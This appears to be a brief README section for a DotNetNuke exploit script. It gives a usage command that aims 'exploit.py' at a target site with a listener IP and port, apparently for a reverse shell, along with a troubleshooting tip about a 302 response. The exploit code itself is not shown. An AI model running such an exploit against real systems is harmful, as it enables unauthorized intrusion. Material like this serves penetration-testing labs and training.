# DotNetNuke

You can then run the script as follows:
```bash
python3 exploit.py -t http://dnn/dotnetnuke -l 192.168.45.193 -p 4444
# You can add -d for debug mode
# or --proxy to use burp proxies
```
![DotNetNuke example](/.images/dnn.png)

> [!NOTE]
> If you receive a **302 status code on the first request** (`[step 1] GET http://dnn/dotnetnuke/<random>`), you may need to manually visit the website (`http://dnn/dotnetnuke`) before using the exploit.
> Don't ask me why ...